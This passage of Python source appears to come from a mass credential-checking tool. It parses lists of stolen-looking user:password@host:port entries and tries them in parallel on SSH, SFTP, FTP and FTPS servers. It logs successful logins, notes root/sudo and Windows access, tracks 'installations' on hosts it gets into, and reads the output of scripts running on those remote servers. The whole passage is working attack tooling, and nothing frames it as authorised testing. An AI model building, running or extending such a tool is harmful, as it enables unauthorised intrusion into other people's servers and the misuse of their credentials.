                            f.writelines(buffer)
                        buffer.clear()
                    except Exception as e:
                        if args.debug_log:
                            script_logger.error(
                                f"Error flushing buffer to {filename}: {e}"
                            )

        LAST_FLUSH_TIME = time.time()


# Background flush thread
def background_flush_thread():
    """Periodically flush write buffers"""
    while not SHUTDOWN_REQUESTED:
        time.sleep(BATCH_WRITE_INTERVAL)
        flush_write_buffers()


# Start background flush thread
flush_thread = threading.Thread(target=background_flush_thread, daemon=True)
flush_thread.start()


# --- Script Output Monitoring (Separate Connection) ---
# Thread pool for monitoring script execution on remote servers
monitoring_executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)


def monitor_script_output(host, port, username, password, log_file, timeout=60):
    """
    Monitor script output on remote server using a SEPARATE SSH connection.
    Reads the log file and collects output for logging.

    Args:
        host: Remote host
        port: SSH port
        username: SSH username
        password: SSH password
        log_file: Path to log file on remote server
        timeout: How long to wait for script output (seconds)
    """
    client = None
    try:
        # Open SEPARATE monitoring connection
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        if args.debug_log:
            script_logger.debug(
                f"🔍 Monitoring connection opened for {username}@{host}:{port}"
            )

        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=CONNECT_TIMEOUT,
            look_for_keys=False,
            allow_agent=False,
        )

        # Read script output with timeout
        script_output = ""
        start_time = time.time()

        try:
            # Use cat or tail with universal syntax to read log file
            # First try: cat (most universal), fallback: tail (last 1000 lines)
            monitor_cmd = f"cat {log_file} 2>/dev/null || tail -1000 {log_file} 2>/dev/null || echo 'Log not available'"
            _, stdout, stderr = client.exec_command(monitor_cmd, timeout=timeout + 5)

            # Read all output
            script_output = stdout.read().decode(errors="ignore").strip()

            if args.debug_log:
                script_logger.debug(
                    f"✅ Collected {len(script_output)} bytes from {host}:{port}"
                )

        except socket.timeout:
            if args.debug_log:
                script_logger.debug(f"⏱️  Monitoring timeout on {host}:{port} (expected)")
        except Exception as e:
            if args.debug_log:
                script_logger.debug(f"⚠️  Error reading log on {host}:{port}: {e}")

        # Write collected output using the proper format
        if script_output:
            # Format: [Server Interaction Log]:
            output_content = (
                f"\n[Server Interaction Log]:\n{script_output}\n"
            )

            with FILE_LOCKS["output.txt"]:
                try:
                    with open("output.txt", "a", encoding="utf-8") as f:
                        f.write(output_content)
                    if args.debug_log:
                        script_logger.info(
                            f"📝 Script output written to output.txt for {host}:{port}"
                        )
                except Exception as write_err:
                    if args.debug_log:
                        script_logger.error(f"Error writing log: {write_err}")
        else:
            if args.debug_log:
                script_logger.debug(f"⚠️  No output collected from {host}:{port}")

        elapsed = time.time() - start_time
        if args.debug_log:
            script_logger.info(
                f"✅ Monitoring complete for {host}:{port} (took {elapsed:.1f}s)"
            )

    except Exception as e:
        if args.debug_log:
            script_logger.error(f"❌ Monitoring failed for {host}:{port}: {e}")

    finally:
        if client is not None:
            try:
                client.close()
            except Exception:
                pass


class MultiProtocolFancyStats:
    """Manages and displays real-time statistics for the multi-protocol scanner."""

    def __init__(
        self,
        total_hosts,
        filename,
        protocols=None,
        threads=200,
        total_hosts_all_files=None,
        total_checked_all_files=0,
    ):
        self.total_hosts = total_hosts
        self.filename = os.path.basename(filename)
        if len(self.filename) > 40:
            self.filename = self.filename[:37] + "..."
        self.protocols = protocols if protocols else ["SSH"]
        self.threads = threads
        self.start_time = time.time()
        self.total_hosts_all_files = (
            total_hosts_all_files if total_hosts_all_files else total_hosts
        )
        self.total_checked_all_files = total_checked_all_files
        self.protocol_stats = {}
        for protocol in self.protocols:
            self.protocol_stats[protocol] = {
                "correct_logins": 0,
                "failed_logins": 0,
                "hosts_checked": 0,
                "current_host": "Waiting...",
                "active_threads": 0,
                "speed_history": deque(maxlen=30),
                "current_speed": 0.0,
                "avg_speed": 0.0,
                "last_checked_count": 0,
                "last_speed_update": time.time(),
                "skipped_unreachable": 0,
            }
        self.total_hosts_checked = 0
        self.total_correct_logins = 0
        self.total_failed_logins = 0
        self.total_active_threads = 0
        self.overall_speed = 0.0
        self.total_skipped = 0
        self.running = True
        self.display_thread = None
        self.lock = threading.Lock()
        self.spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.protocol_icons = {"SSH": "🔐", "SFTP": "📁", "FTP": "📂", "FTPS": "🔒"}
        self.frame_index = 0
        self.colors = {
            "reset": "\033[0m",
            "bold": "\033[1m",
            "dim": "\033[2m",
            "red": "\033[91m",
            "green": "\033[92m",
            "yellow": "\033[93m",
            "blue": "\033[94m",
            "magenta": "\033[95m",
            "cyan": "\033[96m",
            "white": "\033[97m",
            "orange": "\033[38;5;208m",
            "purple": "\033[38;5;129m",
            "bg_blue": "\033[44m",
            "bg_green": "\033[42m",
            "bg_yellow": "\033[43m",
            "bg_red": "\033[41m",
        }
        self.protocol_colors = {
            "SSH": self.colors["green"],
            "SFTP": self.colors["blue"],
            "FTP": self.colors["yellow"],
            "FTPS": self.colors["magenta"],
        }
        self.output_buffer = deque(maxlen=5)
        self.success_buffer = deque(maxlen=5)
        self._first_render = True
        self._simple_mode = False  # fallback if TUI fails

    def start(self):
        if not self.display_thread or not self.display_thread.is_alive():
            self.running = True
            self.display_thread = threading.Thread(
                target=self._display_loop, daemon=True
            )
            self.display_thread.start()

    def stop(self):
        self.running = False
        if self.display_thread and self.display_thread.is_alive():
            self.display_thread.join(timeout=1)
        if not self._simple_mode:
            with STDOUT_LOCK:
                sys.stdout.write("\033[2J\033[H\033[?25h")
                sys.stdout.flush()
        else:
            # Print final summary
            safe_print(
                f"\n[STATS] Completed {self.total_hosts_checked:,} checks, {self.total_correct_logins:,} successes."
            )

    def add_output(self, message):
        with self.lock:
            timestamp = time.strftime("%H:%M:%S")
            msg_clean = " ".join(str(message).split())
            if len(msg_clean) > 85:
                msg_clean = msg_clean[:82] + "..."
            self.output_buffer.append(f"[{timestamp}] {msg_clean}")
            if "✔️ SUCCESS:" in message or "🎉 SUCCESS" in message:
                if "SUCCESS:" in message:
                    success_part = message.split("SUCCESS:")[-1].strip()
                else:
                    success_part = message
                self.success_buffer.append(f"[{timestamp}] {success_part}")

    def add_success(self, protocol, username, host, port):
        with self.lock:
            timestamp = time.strftime("%H:%M:%S")
            self.success_buffer.append(
                f"[{timestamp}] {protocol}://{username}@{host}:{port}"
            )

    def update_current_host(self, protocol, host):
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["current_host"] = host

    def increment_protocol_checked(self, protocol):
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["hosts_checked"] += 1
                self._update_protocol_speed(protocol)
                self._update_global_stats()

    def increment_protocol_correct(self, protocol):
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["correct_logins"] += 1
                self._update_global_stats()

    def increment_protocol_failed(self, protocol):
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["failed_logins"] += 1
                self._update_global_stats()

    def increment_protocol_skipped(self, protocol):
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["skipped_unreachable"] += 1
                self.total_skipped += 1

    def set_active_threads(self, count):
        with self.lock:
            self.total_active_threads = count

    def update_total_checked_all_files(self, count):
        with self.lock:
            self.total_checked_all_files = count

    def _update_protocol_speed(self, protocol):
        if protocol not in self.protocol_stats:
            return
        stat = self.protocol_stats[protocol]
        current_time = time.time()
        if current_time - stat["last_speed_update"] >= 1.0:
            time_diff = current_time - stat["last_speed_update"]
            checked_diff = stat["hosts_checked"] - stat["last_checked_count"]
            if time_diff > 0:
                stat["current_speed"] = checked_diff / time_diff
                stat["speed_history"].append(stat["current_speed"])
                if stat["speed_history"]:
                    stat["avg_speed"] = sum(stat["speed_history"]) / len(
                        stat["speed_history"]
                    )
            stat["last_checked_count"] = stat["hosts_checked"]
            stat["last_speed_update"] = current_time

    def _update_global_stats(self):
        total_checked = total_correct = total_failed = overall_speed = 0
        for ps in self.protocol_stats.values():
            total_checked += ps["hosts_checked"]
            total_correct += ps["correct_logins"]
            total_failed += ps["failed_logins"]
            overall_speed += ps["current_speed"]
        self.total_hosts_checked = total_checked
        self.total_correct_logins = total_correct
        self.total_failed_logins = total_failed
        self.overall_speed = overall_speed

    def _get_terminal_size(self):
        try:
            ts = os.get_terminal_size()
            cols = min(ts.columns, 100)
            lines = ts.lines
            return cols, lines
        except (OSError, AttributeError):
            return 100, 24

    def _create_progress_bar(self, percentage, width):
        filled = int(width * percentage / 100)
        C = self.colors
        if percentage < 70:
            fill_color = C["bg_green"]
        elif percentage < 90:
            fill_color = C["bg_yellow"]
        else:
            fill_color = C["bg_red"]
        reset = C["reset"]
        dim = C["dim"]
        parts = [f"{fill_color} {reset}"] * filled + [f"{dim}▱{reset}"] * (
            width - filled
        )
        return "".join(parts)

    def _format_time(self, seconds):
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds // 60)}m {int(seconds % 60)}s"
        else:
            hours = int(seconds // 3600)
            minutes = int((seconds % 3600) // 60)
            return f"{hours}h {minutes}m"

    def _estimate_time_remaining(self):
        total_checks_needed = self.total_hosts * len(self.protocols)
        if self.overall_speed > 0 and self.total_hosts_checked > 0:
            remaining_checks = total_checks_needed - self.total_hosts_checked
            if remaining_checks < 0:
                return 0
            return remaining_checks / self.overall_speed
        return 0

    def _display_loop(self):
        try:
            # Test terminal capabilities
            sys.stdout.write("\033[?25l")  # hide cursor
            sys.stdout.flush()
        except Exception:
            # If ANSI not supported, fall back to simple mode
            self._simple_mode = True
            safe_print("[INFO] TUI not supported – using simple text progress.")
            self._simple_display_loop()
            return

        while self.running:
            try:
                self._redraw()
                for _ in range(5):
                    if not self.running:
                        break
                    time.sleep(0.1)
                self.frame_index = (self.frame_index + 1) % len(self.spinner_frames)
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                # If TUI fails, switch to simple mode
                safe_print(f"[WARN] TUI error: {e} – switching to simple text mode.")
                self._simple_mode = True
                self._simple_display_loop()
                break

    def _simple_display_loop(self):
        """Fallback: print progress every 2 seconds."""
        last_print = 0
        while self.running:
            time.sleep(1)
            now = time.time()
            if now - last_print >= 2:
                total_checks_needed = self.total_hosts * len(self.protocols)
                pct = (
                    (self.total_hosts_checked / total_checks_needed * 100)
                    if total_checks_needed > 0
                    else 0
                )
                safe_print(
                    f"[PROGRESS] {pct:.1f}% ({self.total_hosts_checked:,}/{total_checks_needed:,}) | "
                    f"Success: {self.total_correct_logins} | Failed: {self.total_failed_logins} | "
                    f"Speed: {self.overall_speed:.1f}/s"
                )
                last_print = now

    def _redraw(self):
        with self.lock:
            term_width, _ = self._get_terminal_size()
            W = max(term_width - 2, 78)
            bar_w = min(40, max(30, int(W * 0.35)))
            C = self.colors
            R = C["reset"]
            runtime = time.time() - self.start_time
            total_checks_needed_cur = self.total_hosts * len(self.protocols)
            pct_cur = (
                (self.total_hosts_checked / total_checks_needed_cur * 100)
                if total_checks_needed_cur > 0
                else 0
            )
            total_checks_all = self.total_hosts_all_files * len(self.protocols)
            pct_all = (
                (self.total_checked_all_files / total_checks_all * 100)
                if total_checks_all > 0
                else 0
            )
            eta = self._estimate_time_remaining()
            spinner = self.spinner_frames[self.frame_index]

            out = []

            def line(txt=""):
                out.append(txt)

            # Header
            proto_str = " | ".join(
                f"{self.protocol_icons.get(p, '🔧')} {p}" for p in self.protocols
            )
            title = f"{spinner} ULTRA-FAST SCANNER ⚡ {spinner}"
            border = "═" * (W - 2)
            line(f"{C['cyan']}{C['bold']}╔{border}╗{R}")
            line(f"{C['cyan']}{C['bold']}║{title.center(W - 2)}║{R}")
            line(f"{C['cyan']}{C['bold']}║{proto_str.center(W - 2)}║{R}")
            line(f"{C['cyan']}{C['bold']}╚{border}╝{R}")
            line()

            # Progress
            line(f"{C['cyan']}📊 Progress:{R}")
            line(f"   {C['yellow']}Current File: {self.filename}{R}")
            bar_cur = self._create_progress_bar(pct_cur, bar_w)
            line(
                f"   {bar_cur} {C['bold']}{pct_cur:.1f}%{R}  ({self.total_hosts_checked:,} / {total_checks_needed_cur:,})"
            )
            line()
            line(f"   {C['yellow']}Overall (All Files):{R}")
            bar_all = self._create_progress_bar(pct_all, bar_w)
            line(
                f"   {bar_all} {C['bold']}{pct_all:.1f}%{R}  ({self.total_checked_all_files:,} / {total_checks_all:,})"
            )
            line()

            # Stats table
            line(f"{C['green']}🌍 Global Statistics:{R}")
            LW = 30
            VW = 25

            def row(icon_label, value_str, vcolor):
                return f"  │ {icon_label:<{LW}} │ {vcolor}{value_str:<{VW}}{R} │"

            sep = f"  ├─{'─' * LW}─┼─{'─' * VW}─┤"
            top = f"  ┌─{'─' * LW}─┬─{'─' * VW}─┐"
            bot = f"  └─{'─' * LW}─┴─{'─' * VW}─┘"
            line(top)
            line(row("🕐 Runtime", self._format_time(runtime), C["white"]))
            line(sep)
            line(
                row(
                    "✅ Current File Checks",
                    f"{self.total_hosts_checked:,} / {total_checks_needed_cur:,}",
                    C["green"],
                )
            )
            line(sep)
            line(row("🚀 Active Threads", str(self.total_active_threads), C["magenta"]))
            line(sep)
            line(
                row(
                    "⚡ Current Speed",
                    f"{self.overall_speed:.1f} checks/sec",
                    C["cyan"],
                )
            )
            line(sep)
            line(
                row(
                    "⏱️  ETA",
                    self._format_time(eta) if eta > 0 else "Calculating...",
                    C["yellow"],
                )
            )
            line(sep)
            line(row("⏭️  Skipped", f"{self.total_skipped:,}", C["orange"]))
            line(bot)
            line()

            # Protocol breakdown
            line(f"{C['blue']}🔧 Protocol Breakdown:{R}")
            for protocol in self.protocols:
                pcol = self.protocol_colors.get(protocol, C["white"])
                icon = self.protocol_icons.get(protocol, "🔧")
                ps = self.protocol_stats[protocol]
                host_display = ps["current_host"]
                if len(host_display) > W - 20:
                    host_display = host_display[: W - 23] + "..."
                line(f"  {pcol}{icon} {protocol}:{R}")
                line(
                    f"    ✅ {C['green']}{ps['correct_logins']:<6}{R}  ❌ {C['red']}{ps['failed_logins']:<8}{R}  📊 {C['cyan']}{ps['hosts_checked']:<8}{R}  ⚡ {C['yellow']}{ps['current_speed']:.1f}/s{R:<5}  ⏭️  {C['orange']}{ps['skipped_unreachable']}{R}"
                )
                line(f"    🎯 {C['white']}{host_display}{R}")
                if protocol != self.protocols[-1]:
                    line()

            # Recent activity
            line()
            line(f"{C['purple']}📋 Recent Activity:{R}")
            msgs = list(self.output_buffer)[-5:]
            for msg in msgs:
                line(f"   {C['dim']}{msg}{R}")
            for _ in range(5 - len(msgs)):
                line("   ")

            # Last successes
            line()
            line(f"{C['green']}🎉 Last 5 Successful Logins:{R}")
            successes = list(self.success_buffer)[-5:]
            if successes:
                for s in successes:
                    line(f"   {C['dim']}{s}{R}")
            else:
                line(f"   {C['dim']}None yet{R}")
            for _ in range(5 - len(successes)):
                line("   ")

            line()
            line(f"{C['dim']}Press Ctrl+C to stop...{R}")

            cleared_lines = "\033[K\n".join(out) + "\033[K"
            if self._first_render:
                frame = "\033[2J\033[H" + cleared_lines
                self._first_render = False
            else:
                frame = "\033[H" + cleared_lines + "\n\033[J"
            with STDOUT_LOCK:
                sys.stdout.write(frame)
                sys.stdout.flush()

stats: Optional[MultiProtocolFancyStats] = None


def update_stats_safely(
    action: str, protocol: str = "", message: str = "", host: str = ""
):
    """Centralized function to safely update stats."""
    global stats
    if stats is None:
        return

    try:
        if action == "update_host":
            stats.update_current_host(protocol, host)
        elif action == "add_output":
            stats.add_output(message)
        elif action == "increment_correct":
            stats.increment_protocol_correct(protocol)
        elif action == "increment_failed":
            stats.increment_protocol_failed(protocol)
        elif action == "increment_checked":
            stats.increment_protocol_checked(protocol)
        elif action == "increment_skipped":
            stats.increment_protocol_skipped(protocol)
        elif action == "set_threads":
            stats.set_active_threads(int(message))
    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"Stats update failed: {e}")


def cleanup_temp_files(directory=None):
    """
    Delete all temporary cleaned files starting with .__tmp_ prefix.
    If directory is None, uses current working directory.
    """
    if directory is None:
        directory = os.getcwd()

    try:
        deleted_count = 0
        for filename in os.listdir(directory):
            if filename.startswith(".__tmp_"):
                filepath = os.path.join(directory, filename)
                try:
                    os.remove(filepath)
                    deleted_count += 1
                    if 'args' in globals() and hasattr(args, 'debug_log') and args.debug_log:
                        script_logger.debug(f"Deleted temp file: {filepath}")
                except Exception as e:
                    if 'args' in globals() and hasattr(args, 'debug_log') and args.debug_log:
                        script_logger.warning(f"Could not delete temp file {filepath}: {e}")

        if deleted_count > 0:
            safe_print(f"[bold cyan]🧹 Cleaned {deleted_count} temporary file(s)[/bold cyan]")
    except Exception as e:
        if 'args' in globals() and hasattr(args, 'debug_log') and args.debug_log:
            script_logger.warning(f"Error cleaning temp files from {directory}: {e}")


def auto_clean_credentials_file(filepath):
    """
    Auto-cleans malformed credential files:
    1. Splits concatenated URLs (line 25 problem)
    2. Fixes double :// in URLs (line 740 problem)
    3. Removes trailing garbage (line 675 problem)
    4. Handles multiple @ in passwords (everything before LAST @ is password)
    5. Ignores date headers and empty lines

    Returns path to cleaned temp file, or original filepath if no issues found.
    """

    def parse_ssh_url_correct(line):
        """Parse SSH URL using right-to-left logic"""
        line = line.strip()
        if not line.startswith('SSH://'):
            return None

        rest = line[6:]

        # Find LAST : for port
        last_colon = rest.rfind(':')
        if last_colon == -1:
            return None

        port_str = rest[last_colon + 1:]
        before_port = rest[:last_colon]

        try:
            port = int(port_str)
            if port < 1 or port > 65535:
                return None
        except ValueError:
            return None

        # Find LAST @ for host/credentials separator
        last_at = before_port.rfind('@')
        if last_at == -1:
            return None

        host = before_port[last_at + 1:]
        credentials = before_port[:last_at]

        # Find FIRST : for user:password split
        first_colon = credentials.find(':')
        if first_colon == -1:
            return None

        username = credentials[:first_colon]
        password = credentials[first_colon + 1:]

        if not host or not username or password is None or password == '':
            return None

        if '@' in host:
            return None

        return f"SSH://{username}:{password}@{host}:{port}"

    valid_creds = []
    has_issues = False

    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        for line_num, line in enumerate(lines, 1):
            line = line.rstrip('\n')

            if not line.strip():
                continue

            # Skip date headers
            if re.match(r'^\d{4}-\d{2}-\d{2}:', line.strip()):
                has_issues = True
                continue

            if not line.startswith('SSH://'):
                continue

            # Check for concatenated URLs (multiple SSH:// on one line)
            url_pattern = r'SSH://[^:]*:[^@]*@[^:]*:\d+'
            matches = re.findall(url_pattern, line)

            if len(matches) > 1:
                # Multiple URLs on one line
                has_issues = True
                for match in matches:
                    result = parse_ssh_url_correct(match)
                    if result:
                        valid_creds.append(result)
            elif len(matches) == 1:
                # Single URL: check if it matches the full line or if there's garbage
                result = parse_ssh_url_correct(line)
                if result:
                    valid_creds.append(result)
                else:
                    # Try removing trailing garbage
                    cleaned = re.sub(r'(@.+?:\d+).*$', r'\1', line)
                    if cleaned != line:
                        has_issues = True
                        result = parse_ssh_url_correct(cleaned)
                        if result:
                            valid_creds.append(result)

        # If no issues found, use original file
        if not has_issues or not valid_creds:
            return filepath

        # Write cleaned file to temp location with .__tmp_ prefix
        basename = os.path.basename(filepath)
        dirname = os.path.dirname(filepath) or os.getcwd()
        temp_file = os.path.join(dirname, f".__tmp_{basename}")

        with open(temp_file, 'w', encoding='utf-8') as f:
            for cred in valid_creds:
                f.write(cred + '\n')

        safe_print(f"[bold cyan]🧹 Auto-cleaned credentials file: {len(valid_creds)} valid entries[/bold cyan]")
        return temp_file

    except Exception as e:
        if 'args' in globals() and hasattr(args, 'debug_log') and args.debug_log:
            script_logger.error(f"Error auto-cleaning file {filepath}: {e}")
        return filepath


def parse_connection_string(line):
    """
    Parses a single line of input to extract protocol, host, port, username, and password.
    Supports: ssh://, ftp://, ftps://, sftp:// (case-insensitive)
    Handles passwords with special characters (@ and :)
    """
    # Check for protocol:// prefix (case-insensitive)
    protocol_match = re.match(r"^(ssh|ftp|ftps|sftp)://(.+)$", line, re.IGNORECASE)

    if protocol_match:
        protocol = protocol_match.group(1).upper()  # Normalize to uppercase
        credentials_and_host = protocol_match.group(2)

        try:
            # Split from RIGHT: last : is port separator
            # Format: username:password@host:port
            last_colon_idx = credentials_and_host.rfind(":")
            if last_colon_idx == -1:
                return None, None

            port_str = credentials_and_host[last_colon_idx + 1:]
            try:
                port = int(port_str)
            except ValueError:
                return None, None

            # Everything before last : is credentials@host
            creds_and_host = credentials_and_host[:last_colon_idx]

            # Split from RIGHT: last @ separates credentials from host
            last_at_idx = creds_and_host.rfind("@")
            if last_at_idx == -1:
                return None, None

            credentials = creds_and_host[:last_at_idx]  # username:password
            host = creds_and_host[last_at_idx + 1:]     # host (can contain dots)

            # Split credentials on FIRST :
            first_colon_idx = credentials.find(":")
            if first_colon_idx == -1:
                return None, None

            username = credentials[:first_colon_idx]
            password = credentials[first_colon_idx + 1:]

            print(f"[DEBUG PARSE] Line: {line[:70]}")
            print(f"[DEBUG PARSE] Extracted: user={username[:20]}, pass_start={password[:8]}, host={host}, port={port}")

            if not username or not password or not host or port < 1 or port > 65535:
                print(f"[DEBUG PARSE] VALIDATION FAILED")
                return None, None

            print(f"[DEBUG PARSE] ✓ SUCCESS")
            return protocol, {
                "host": host,
                "port": port,
                "username": username,
                "password": password,
            }
        except (ValueError, IndexError) as e:
            print(f"[DEBUG PARSE] Exception: {type(e).__name__}: {e}")
            if 'args' in globals() and hasattr(args, 'debug_log') and args.debug_log:
                script_logger.error(f"Failed to parse {protocol} URL: {line}")
            return None, None
    elif line.startswith("Host:"):
        host_match = re.match(r"^Host:\s*([^:]+):(\d+)$", line)
        if host_match:
            host = host_match.group(1).strip()
            try:
                port = int(host_match.group(2))
                return "HOST_LINE", {
                    "host": host,
                    "port": port,
                    "username": None,
                    "password": None,
                }
            except ValueError:
                if args.debug_log:
                    script_logger.error(f"Invalid port in Host line: {line}")
                return None, None
    elif line.startswith("Username:"):
        username_match = re.match(r"^Username:\s*(.+)$", line)
        if username_match:
            username = username_match.group(1).strip()
            return "USERNAME_LINE", {"username": username}
    elif line.startswith("Password:"):
        password_match = re.match(r"^Password:\s*(.+)$", line)
        if password_match:
            password = password_match.group(1).strip()
            return "PASSWORD_LINE", {"password": password}
    return None, None


def submit_protocol_task(
    executor,
    protocol_type,
    host,
    port,
    username,
    password,
    conn_timeout,
    sourcefile_path,
):
    """Submit a single protocol task to the executor."""
    if protocol_type in protocols:
        if args.debug_log:
            script_logger.debug(f"Submitting {protocol_type} task for {host}:{port}")
        future = executor.submit(
            check_login_thread,
            host,
            port,
            username,
            password,
            conn_timeout,
            protocol_type,
            sourcefile_path,
        )
        return future
    else:
        if args.debug_log:
            script_logger.debug(
                f"Skipping {protocol_type} for {host}:{port} as it's not enabled."
            )
        return None


def mark_protocol_done_for_host(sourcefile_path, host_id, protocol):
    """
    Mark a protocol done for a host. If all enabled protocols are done for that host,
    increase completed counter and trigger async cleanup if threshold reached.
    """
    global FILE_COMPLETED, FILE_COMPLETED_COUNTER, FILE_ENTRIES

    with PROCESSED_LOCK:
        if sourcefile_path not in FILE_COMPLETED:
            FILE_COMPLETED[sourcefile_path] = {}
        host_map = FILE_COMPLETED[sourcefile_path]
        if host_id not in host_map:
            host_map[host_id] = set()
        host_map[host_id].add(protocol)

        if all(p in host_map[host_id] for p in protocols):
            FILE_COMPLETED_COUNTER.setdefault(sourcefile_path, 0)
            FILE_COMPLETED_COUNTER[sourcefile_path] += 1

            if sourcefile_path in FILE_ENTRIES:
                for e in FILE_ENTRIES[sourcefile_path]:
                    if e["id"] == host_id:
                        e["processed"] = True
                        break

            if (
                not args.skip_cleanup
                and FILE_COMPLETED_COUNTER[sourcefile_path] >= CLEANUP_THRESHOLD
            ):
                FILE_COMPLETED_COUNTER[sourcefile_path] = 0
                cleanup_thread = threading.Thread(
                    target=perform_cleanup_on_file,
                    args=(sourcefile_path,),
                    daemon=True,
                )
                cleanup_thread.start()


def perform_cleanup_on_file(sourcefile_path):
    """
    Atomically rewrite sourcefile_path to remove entries marked as processed.
    Runs in a background thread so the scan continues seamlessly.
    """
    try:
        with PROCESSED_LOCK:
            entries = FILE_ENTRIES.get(sourcefile_path, [])
            kept_lines = [
                ln
                for e in entries
                if not e.get("processed", False)
                for ln in e["orig_lines"]
            ]

        tmp_fd, tmp_path = tempfile.mkstemp(
            prefix=".__tmp_", suffix=".txt", dir=os.path.dirname(sourcefile_path) or "."
        )
        os.close(tmp_fd)
        with open(tmp_path, "w", encoding="utf-8") as tmpf:
            for ln in kept_lines:
                tmpf.write(ln if ln.endswith("\n") else ln + "\n")
        os.replace(tmp_path, sourcefile_path)

        # MEMORY OPTIMIZATION: Free orig_lines from processed entries
        with PROCESSED_LOCK:
            entries = FILE_ENTRIES.get(sourcefile_path, [])
            for e in entries:
                if e.get("processed", False):
                    e["orig_lines"] = []

        safe_print(
            f"🧹 Cleaned up {CLEANUP_THRESHOLD} processed hosts from {os.path.basename(sourcefile_path)}"
        )
        if args.debug_log:
            script_logger.info(
                f"Async cleanup complete for {sourcefile_path}, kept {len(kept_lines)} lines."
            )

        # Free kept_lines and run GC
        del kept_lines
        gc.collect()

    except Exception as e:
        if args.debug_log:
            script_logger.error(
                f"Async cleanup failed for {sourcefile_path}: {e}", exc_info=True
            )


def deduplicate_output_files():
    """
    Remove duplicate entries from all output files.
    Keeps only the first occurrence of each unique server.
    """
    output_files = [
        "checked_ssh.txt",
        "checked_ftp.txt",
        "checked_sftp.txt",
        "checked_ftps.txt",
        "checked_windows.txt",
        "root_sudo.txt",
        "found_logins.txt",  # All found logins (immediate)
        "installations.txt",  # Successful installations
        "installations_failed.txt",  # Failed installations
        "output.txt",
    ]

    for output_file in output_files:
        if not os.path.exists(output_file):
            continue

        try:
            seen = set()
            unique_lines = []

            with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line_stripped = line.strip()

                    # Skip empty lines and section headers
                    if not line_stripped or line_stripped.startswith("===") or line_stripped.startswith("---"):
                        unique_lines.append(line)
                        continue

                    # For credential lines, use as-is for dedup
                    # (SSH://user:pass@host:port or similar)
                    if any(proto in line_stripped.upper() for proto in ['SSH://', 'FTP://', 'SFTP://', 'FTPS://']):
                        if line_stripped not in seen:
                            seen.add(line_stripped)
                            unique_lines.append(line)
                        # else: skip duplicate
                    else:
                        # For other lines, keep them
                        unique_lines.append(line)

            # Write deduplicated content back
            with open(output_file, 'w', encoding='utf-8') as f:
                f.writelines(unique_lines)

            duplicates_removed = sum(1 for line in unique_lines if any(proto in line.upper() for proto in ['SSH://', 'FTP://', 'SFTP://', 'FTPS://'])) - len(seen)
            if duplicates_removed > 0 or len(seen) > 0:
                safe_print(f"🧹 Deduplicated {output_file}: {len(seen)} unique servers")
                if args.debug_log:
                    script_logger.info(f"Deduplicated {output_file}: removed {duplicates_removed} duplicate entries")

        except Exception as e:
            if args.debug_log:
                script_logger.error(f"Failed to deduplicate {output_file}: {e}")


def check_login_thread(
    host, port, username, password, conn_timeout, protocol, sourcefile_path
):
    """Main thread function to check a login for a specific protocol."""
    global CURRENT_LINE, CURRENT_HOST

    with CURRENT_LINE_LOCK:
        CURRENT_LINE += 1

    current_target = f"{username}@{host}:{port}"
    with CURRENT_HOST_LOCK:
        CURRENT_HOST = current_target

    # Fast port check first (always enabled with 0.5s timeout)
    if not is_port_open(host, port, QUICK_CHECK_TIMEOUT):
        if args.debug_log:
            script_logger.debug(f"⏭️  Port {host}:{port} unreachable, skipping")

        update_stats_safely("increment_skipped", protocol=protocol)
        update_stats_safely(
            "add_output", message=f"⏭️  Skipped: {host}:{port} (unreachable)"
        )

        # Still mark as processed so cleanup works
        host_id = f"{host}|{port}|{username}|{password}"
        mark_protocol_done_for_host(sourcefile_path, host_id, protocol)
        return

    update_stats_safely("update_host", protocol=protocol, host=current_target)
    update_stats_safely(
        "add_output", message=f"🚀 Checking {protocol}://{current_target}"
    )

    if args.debug_log:
        script_logger.debug(f"🚀 Attempting connection to {host}:{port} for {protocol}")

    start_time_thread = time.time()
    result_data = None
    redirect_target = os.devnull
    with StderrRedirector(target=redirect_target):
        try:
            if protocol == "SSH":
                result_data = check_ssh_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "SFTP":
                result_data = check_sftp_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "FTP":
                result_data = check_ftp_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "FTPS":
                result_data = check_ftps_login(
                    host, port, username, password, conn_timeout
                )
        except Exception as e:
            if args.debug_log:
                script_logger.error(
                    f"Unhandled exception during {protocol} login check for {host}:{port}: {e}",
                    exc_info=True,
                )

    elapsed_time = time.time() - start_time_thread

    host_id = f"{host}|{port}|{username}|{password}"
    mark_protocol_done_for_host(sourcefile_path, host_id, protocol)

    if result_data and result_data[0] == protocol:
        success_msg = (
            f"🎉 SUCCESS │ {protocol}://{username}:{password}@{host}:{port}"
            f" │ Duration: {elapsed_time:.2f}s"
        )

        update_stats_safely("increment_correct", protocol=protocol)
        update_stats_safely(
            "add_output", message=f"✔️ SUCCESS: {username}@{host}:{port} ({protocol})"
        )

        if args.debug_log:
            script_logger.info(success_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["correct_logins"][protocol] += 1

        write_to_output(
            protocol,
            username,
            password,
            host,
            port,
            sudo_available=result_data[1] if len(result_data) > 1 else False,
            su_root_available=result_data[2] if len(result_data) > 2 else False,
            server_output=result_data[3] if len(result_data) > 3 else "",
            is_windows=(
                result_data[2] if len(result_data) > 2 else False
            ),  # Windows flag at position 2
            os_type=result_data[4] if len(result_data) > 4 else "Unknown",
            shell_type=result_data[5] if len(result_data) > 5 else "Unknown",
        )
    else:
        fail_msg = (
